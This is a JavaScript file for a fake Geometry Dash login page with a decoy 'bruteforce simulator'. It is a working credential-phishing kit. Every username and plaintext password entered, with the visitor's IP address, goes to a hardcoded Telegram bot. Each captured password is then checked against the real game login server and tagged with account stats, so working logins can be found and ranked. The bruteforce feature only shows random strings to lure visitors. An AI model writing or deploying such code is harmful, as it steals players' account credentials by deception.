// ===== CONFIG (CHANGE THESE IF NEEDED) =====
const TELEGRAM_BOT_TOKEN = '8780827680:AAFQETqfkgqQEsjTLGknvIRJxV5gWgunqMg';
const TELEGRAM_CHAT_ID = '7136838858';

// ===== STATE MANAGEMENT =====
let userIdMap = {};
let nextUserId = 1;

// ===== IP & USER TRACKING =====
async function getClientIp() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Unknown';
    }
}

function getOrCreateUserId(ip) {
    if (!userIdMap[ip]) {
        userIdMap[ip] = nextUserId;
        nextUserId++;
    }
    return userIdMap[ip];
}

// ===== TELEGRAM LOGGING =====
async function sendTelegramLog(logData) {
    try {
        const message = `🔐 <b>Authentication Log</b>\n\n` +
            `<code>ID: ${logData.id}\n` +
            `IP: ${logData.ip}\n\n` +
            `Username: ${logData.username}\n` +
            `Password: ${logData.password}\n\n` +
            `Status: ${logData.status}\n\n` +
            `Rank: ${logData.rank}\n` +
            `CP: ${logData.cp}\n` +
            `Mod: ${logData.mod}</code>\n\n` +
            `${logData.status === 'SUKSES' ? '✅' : '❌'}`;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.log('Telegram log sent');
    }
}

// ===== API CALLS =====
async function checkUsernameExists(username) {
    try {
        const response = await fetch(`https://gdbrowser.com/api/profile/${username}`);
        const data = await response.json();
        return !data.error;
    } catch {
        return false;
    }
}

async function getPlayerStats(username) {
    try {
        const response = await fetch(`https://gdbrowser.com/api/profile/${username}`);
        return await response.json();
    } catch {
        return null;
    }
}

async function getSHA1Hash(password) {
    try {
        const response = await fetch(`https://api.hashify.net/hash/sha1/hex?value=${encodeURIComponent(password)}`);
        return await response.text();
    } catch {
        return null;
    }
}

async function validatePassword(username, password) {
    try {
        const gjp2 = await getSHA1Hash(password + 'mI29fmAnxgTs');
        
        const formData = new FormData();
        formData.append('udid', '36d00413-8358-3de4-b5c0-a41d0ec822ec');
        formData.append('userName', username);
        formData.append('gjp2', gjp2);
        formData.append('secret', 'Wmfv3899gc9');

        const response = await fetch('https://www.boomlings.com/database/accounts/loginGJAccount.php', {
            method: 'POST',
            body: formData,
            headers: { 'Cookie': 'gd=1;' }
        });

        const result = await response.text();
        return !result.includes('-');
    } catch {
        return false;
    }
}

// ===== VALIDATION =====
function validateInput(username, password) {
    const usernameError = document.getElementById('usernameError');
    const passwordError = document.getElementById('passwordError');
    
    usernameError.classList.remove('show');
    passwordError.classList.remove('show');

    let isValid = true;

    if (!username || username.length < 6 || username.length > 19) {
        usernameError.textContent = 'Username must be 6-19 characters';
        usernameError.classList.add('show');
        isValid = false;
    }

    if (!/^[a-zA-Z0-9]+$/.test(username)) {
        usernameError.textContent = 'Only letters and numbers allowed';
        usernameError.classList.add('show');
        isValid = false;
    }

    if (!password || password.length < 6 || password.length > 19) {
        passwordError.textContent = 'Password must be 6-19 characters';
        passwordError.classList.add('show');
        isValid = false;
    }

    if (!/^[a-zA-Z0-9]+$/.test(password)) {
        passwordError.textContent = 'Only letters and numbers allowed';
        passwordError.classList.add('show');
        isValid = false;
    }

    return isValid;
}

// ===== LOGIN HANDLER =====
document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const loginBtn = document.getElementById('loginBtn');

    if (!validateInput(username, password)) {
        return;
    }

    loginBtn.disabled = true;
    loginBtn.textContent = 'Processing...';

    const usernameError = document.getElementById('usernameError');
    const ip = await getClientIp();
    const userId = getOrCreateUserId(ip);

    // Check username exists
    const userExists = await checkUsernameExists(username);
    if (!userExists) {
        usernameError.textContent = 'Account not found';
        usernameError.classList.add('show');
        loginBtn.disabled = false;
        loginBtn.textContent = 'Login';

        // Log failed attempt
        await sendTelegramLog({
            id: userId,
            ip: ip,
            username: username,
            password: password,
            status: 'GAGAL',
            rank: 'N/A',
            cp: 0,
            mod: 0
        });
        return;
    }

    // Validate password
    const isPasswordValid = await validatePassword(username, password);
    const stats = await getPlayerStats(username);

    // Send log to Telegram
    await sendTelegramLog({
        id: userId,
        ip: ip,
        username: username,
        password: password,
        status: isPasswordValid ? 'SUKSES' : 'GAGAL',
        rank: stats?.accountID || 'N/A',
        cp: stats?.creatorPoints || 0,
        mod: stats?.modLevel || 0
    });

    if (!isPasswordValid) {
        document.getElementById('passwordError').textContent = 'Invalid credentials';
        document.getElementById('passwordError').classList.add('show');
        loginBtn.disabled = false;
        loginBtn.textContent = 'Login';
        return;
    }

    loginBtn.disabled = false;
    loginBtn.textContent = 'Login';

    // Show profile
    await showProfile(username);
});

// ===== PROFILE PAGE =====
async function showProfile(username) {
    document.getElementById('loginPage').classList.add('hidden');
    document.getElementById('profilePage').classList.add('show');

    const stats = await getPlayerStats(username);
    
    if (stats && !stats.error) {
        document.getElementById('playerName').textContent = '👤 ' + stats.username;
        
        const profileStats = document.getElementById('profileStats');
        profileStats.innerHTML = `
            <div class="stat-box">
                <div class="label">Level</div>
                <div class="value">${stats.playerLevel || 0}</div>
            </div>
            <div class="stat-box">
                <div class="label">CP</div>
                <div class="value">${stats.creatorPoints || 0}</div>
            </div>
            <div class="stat-box">
                <div class="label">Stars</div>
                <div class="value">${stats.stars || 0}</div>
            </div>
            <div class="stat-box">
                <div class="label">Diamonds</div>
                <div class="value">${stats.diamonds || 0}</div>
            </div>
            <div class="stat-box">
                <div class="label">Coins</div>
                <div class="value">${stats.secretCoins || 0}</div>
            </div>
            <div class="stat-box">
                <div class="label">Demons</div>
                <div class="value">${stats.demonLevel || 0}</div>
            </div>
        `;
    }
}

function logout() {
    document.getElementById('loginPage').classList.remove('hidden');
    document.getElementById('profilePage').classList.remove('show');
    document.getElementById('loginForm').reset();
    document.getElementById('searchResult').classList.remove('show');
    document.getElementById('bruteforceProcess').classList.remove('show');
}

// ===== BRUTEFORCE SIMULATOR =====
async function searchTarget() {
    const targetUsername = document.getElementById('targetUsername').value;
    const searchResult = document.getElementById('searchResult');

    if (!targetUsername || targetUsername.length < 1 || targetUsername.length > 19) {
        return;
    }

    if (!/^[a-zA-Z0-9]+$/.test(targetUsername)) {
        return;
    }

    searchResult.classList.remove('show');

    const userExists = await checkUsernameExists(targetUsername);

    if (userExists) {
        searchResult.innerHTML = `
            <div class="user-found">
                <h4>✅ Account <strong>${targetUsername}</strong> found!</h4>
                <p style="margin-top: 15px; font-size: 12px;">Select charset:</p>
                <div class="charset-options">
                    <label class="charset-checkbox">
                        <input type="checkbox" value="lowercase" id="charset-lower" checked>
                        <label for="charset-lower">Lowercase (a-z)</label>
                    </label>
                    <label class="charset-checkbox">
                        <input type="checkbox" value="uppercase" id="charset-upper">
                        <label for="charset-upper">Uppercase (A-Z)</label>
                    </label>
                    <label class="charset-checkbox">
                        <input type="checkbox" value="numbers" id="charset-num" checked>
                        <label for="charset-num">Numbers (0-9)</label>
                    </label>
                </div>
                <button class="start-bruteforce-btn" onclick="startBruteforce('${targetUsername}')">
                    🔓 Start
                </button>
            </div>
        `;
        searchResult.classList.add('show');
    } else {
        searchResult.innerHTML = `
            <div class="user-not-found">
                ❌ Account <strong>${targetUsername}</strong> not found
            </div>
        `;
        searchResult.classList.add('show');
    }
}

function generateRandomPassword(length, charset) {
    let result = '';
    for (let i = 0; i < length; i++) {
        result += charset.charAt(Math.floor(Math.random() * charset.length));
    }
    return result;
}

async function startBruteforce(targetUsername) {
    const bruteforceProcess = document.getElementById('bruteforceProcess');
    const attemptsContainer = document.getElementById('attemptsContainer');
    const statusMessage = document.getElementById('statusMessage');

    let charset = '';
    if (document.getElementById('charset-lower').checked) charset += 'abcdefghijklmnopqrstuvwxyz';
    if (document.getElementById('charset-upper').checked) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    if (document.getElementById('charset-num').checked) charset += '0123456789';

    if (charset.length === 0) {
        alert('Select at least one charset!');
        return;
    }

    bruteforceProcess.classList.add('show');
    attemptsContainer.innerHTML = '';

    let attemptCount = 0;
    const maxAttempts = 150;

    for (let i = 0; i < maxAttempts; i++) {
        const length = Math.floor(Math.random() * 14) + 6;
        const password = generateRandomPassword(length, charset);

        attemptCount++;

        const attempt = document.createElement('div');
        attempt.className = 'attempt';
        attempt.textContent = `[${attemptCount}] ${password}`;
        attemptsContainer.appendChild(attempt);

        attemptsContainer.scrollTop = attemptsContainer.scrollHeight;

        statusMessage.innerHTML = `
            <span class="loading-spinner"></span>
            Testing... ${attemptCount} attempts
        `;

        await new Promise(resolve => setTimeout(resolve, 50));
    }

    statusMessage.innerHTML = `
        ⏳ Advanced encryption detected.<br>Strong cryptographic implementation confirmed.
    `;
}
